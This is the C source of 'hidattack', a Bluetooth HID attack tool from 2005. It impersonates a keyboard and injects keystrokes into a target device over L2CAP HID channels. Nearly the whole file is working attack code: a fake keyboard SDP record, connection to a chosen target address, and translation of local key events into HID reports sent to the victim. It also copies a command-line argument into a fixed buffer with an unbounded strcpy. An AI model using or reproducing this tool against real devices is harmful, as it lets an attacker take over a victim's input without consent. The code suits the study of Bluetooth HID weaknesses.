/*
 *  hidattack v0.1
 *
 *  (c) Collin R. Mulliner <collin@betaversion.net>
 *  http://www.mulliner.org/bluetooth/
 *
 *  License: GPLv2 
 * 
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <malloc.h>
#include <syslog.h>
#include <signal.h>
#include <getopt.h>
#include <sys/poll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <linux/input.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/sdp.h>
#include <bluetooth/hidp.h>

#include "hid.h"
#include "sdp.h"

int cs;
int is;

/*
 *  taken from BlueZ
 */
static int l2cap_listen(const bdaddr_t *bdaddr, unsigned short psm, int lm, int backlog)
{
	struct sockaddr_l2 addr;
	struct l2cap_options opts;
	int sk;

	if ((sk = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
		return -1;

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, bdaddr);
	addr.l2_psm = htobs(psm);

	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		close(sk);
		return -1;
	}

	setsockopt(sk, SOL_L2CAP, L2CAP_LM, &lm, sizeof(lm));

	memset(&opts, 0, sizeof(opts));
	opts.imtu = HIDP_DEFAULT_MTU;
	opts.omtu = HIDP_DEFAULT_MTU;
	opts.flush_to = 0xffff;

	setsockopt(sk, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts));

	if (listen(sk, backlog) < 0) {
		close(sk);
		return -1;
	}

	return sk;
}

/*
 *  taken from BlueZ
 */
static int l2cap_connect(bdaddr_t *src, bdaddr_t *dst, unsigned short psm)
{
	struct sockaddr_l2 addr;
	struct l2cap_options opts;
	int sk;

	if ((sk = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
		return -1;

	memset(&addr, 0, sizeof(addr));
	addr.l2_family  = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, src);

	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		close(sk);
		return -1;
	}

	memset(&opts, 0, sizeof(opts));
	opts.imtu = HIDP_DEFAULT_MTU;
	opts.omtu = HIDP_DEFAULT_MTU;
	opts.flush_to = 0xffff;

	setsockopt(sk, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts));

	memset(&addr, 0, sizeof(addr));
	addr.l2_family  = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, dst);
	addr.l2_psm = htobs(psm);

	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		close(sk);
		return -1;
	}

	return sk;
}

/*
 *  taken from BlueZ
 */
static int l2cap_accept(int sk, bdaddr_t *bdaddr)
{
	struct sockaddr_l2 addr;
	socklen_t addrlen;
	int nsk;

	memset(&addr, 0, sizeof(addr));
	addrlen = sizeof(addr);

	if ((nsk = accept(sk, (struct sockaddr *) &addr, &addrlen)) < 0)
		return -1;

	if (bdaddr)
		bacpy(bdaddr, &addr.l2_bdaddr);

	return nsk;
}

void usage()
{
	fprintf(stderr,	"\nhidattack v0.1 Dec. 2005 Collin R. Mulliner <collin@betaversion.net>\n\n"\
									"syntax: hidattack -hsce\n\n"\
									"\th\t\thelp\n"\
									"\ts\t\tserver mode\n"\
									"\tc <BD_ADDR>\tclient mode - connect to addr\n"\
									"\te <FILE>\tevent file\n");
}

int main(int argc, char **argv)
{
	unsigned char pkg[12];
	int ip;
	int i = 0;
	struct input_event ie;
	bdaddr_t dst;
	struct pollfd pf[3];
	unsigned char ib[1024];
	unsigned char cb[1024];
	int state = 0;
	unsigned char modifiers = 0;
	unsigned char modifiers_old = 0;
	int press = 0;
	int press_old = 0;
	int bitmask[8] = {0};
	int mode = -1;
	char event_file[256] = {0};
	int optid;


	while ((optid = getopt(argc, argv, "hsc:e:")) != -1) {
		switch (optid) {
		case 's':
			mode = 0;
			break;
		case 'c':
			mode = 1;
			str2ba(optarg, &dst);
			break;
		case 'e':
			strcpy(event_file, optarg);
			break;
		default:
			usage();
			exit(0);
		}
	}

	if (sdp_open()) {
		sdp_add_keyboard();
	}
	else {
		fprintf(stderr, "can't connect to local SDP server\n");
		usage();
		exit(0);
	}
	
	if ((ip = open(event_file, O_RDONLY)) < 0) {
		perror("open event input");
		usage();
		exit(0);
	}

	printf("\nhidattack DEM0 (c) Collin R. Mulliner <collin@betaversion.net> http://www.mulliner.org/bluetooth/\n\n");
	
	if (mode == 0) {
		cs = l2cap_listen(BDADDR_ANY, L2CAP_PSM_HIDP_CTRL, 0, 1);
		is = l2cap_listen(BDADDR_ANY, L2CAP_PSM_HIDP_INTR, 0, 1);
		cs = l2cap_accept(cs, NULL);
		perror("HID control channel");
		is = l2cap_accept(is, NULL);
		perror("HID interupt channel");
	}
	else if (mode == 1) {
		cs = l2cap_connect(BDADDR_ANY, &dst, L2CAP_PSM_HIDP_CTRL);
		perror("HID control channel");
		is = l2cap_connect(BDADDR_ANY, &dst, L2CAP_PSM_HIDP_INTR);
		perror("HID interupt channel");
	}
	else {
		fprintf(stderr, "wrong mode\n");
		exit(-1);
	}

	pf[0].fd = ip;
	pf[0].events = POLLIN | POLLERR | POLLHUP;
	pf[1].fd = cs;
	pf[1].events = POLLIN | POLLERR | POLLHUP;
	pf[2].fd = is;
	pf[2].events = POLLIN | POLLERR | POLLHUP;
	
	while (1) {
		pf[0].revents = 0;
		pf[1].revents = 0;
		pf[2].revents = 0;
		
		if (poll(pf, 3, -1) <= 0) {
			continue;
		}
		
		bzero(pkg, 12);

		if (pf[0].revents) {
			if (state == 1) {
			if (read(ip, &ie, sizeof(ie)) <= 0) {
				perror("read ip");
				exit(-1);
			}
			if (ie.type == 0x01) {
				if (state == 1) {

					modifiers_old = modifiers;
					press_old = press;

					switch (ie.code) {
					case KEY_LEFTSHIFT:
						bitmask[1] = (ie.value ? 1 : 0);
						break;
					case KEY_RIGHTSHIFT:
						bitmask[5] = (ie.value ? 1 : 0);
						break;
					case KEY_LEFTALT:
						bitmask[2] = (ie.value ? 1 : 0);
						break;
					case KEY_RIGHTALT:
						bitmask[6] = (ie.value ? 1 : 0);
						break;
					case KEY_LEFTCTRL:
						bitmask[0] = (ie.value ? 1 : 0);
						break;
					case KEY_RIGHTCTRL:
						bitmask[4] = (ie.value ? 1 : 0);
						break;
					default:
						if (ie.value > 0) {
							pkg[4] = keycode2hidp[ie.code];
							//printf("keycode=%d, hidp=%d\n",ie.code,pkg[4]);
							press++;
						}
						else {
							press--;
						}
						break;
					}
					
					modifiers = 0;
					for (i = 0; i < 8; i++) {
						modifiers |= (bitmask[i] << i);
					}
					//printf("modifiers: 0x%02x\n", modifiers);
					
					if (press != press_old || modifiers != modifiers_old) {
						pkg[0] = 0xa1;
						pkg[1] = 0x01;
						pkg[2] = modifiers;
						pkg[3] = 0x00;
						//pkg[4] = 0x00; // the key code
						pkg[5] = 0x00;
						pkg[6] = 0x00;
						pkg[7] = 0x00;
						pkg[8] = 0x00;
						pkg[9] = 0x00;
					
					if (write(is, pkg, 10) <= 0) {
							perror("write");
							exit(-1);
						}
					}
				}
			}
			}
		}
		if (pf[1].revents) {
			int size;
			int i;
			if ((size = read(cs, cb, sizeof(cb))) <= 0) {
				perror("read cs");
				exit(-1);
			}

			printf("cs(%d)\n", size);
			for (i = 0; i < size; i++)
				printf("%02x",cb[i]);
			printf("\n");

			if (state == 0 && size == 1 && cb[0] == 0x70) {
				fprintf(stderr, "got set_protocol BOOT\n");
				pkg[0] = 0;
				write(cs, pkg, 1);
				state = 1;
			}
		}
		if (pf[2].revents) {
			int size;
			int i;
			if ((size = read(is, ib, sizeof(ib))) <= 0) {
				perror("read is");
				exit(-1);
			}
			printf("is(%d): ", size);
			for (i = 0; i < size; i++)
				printf("%02x",ib[i]);
			printf("\n");
		
		}
	}
}
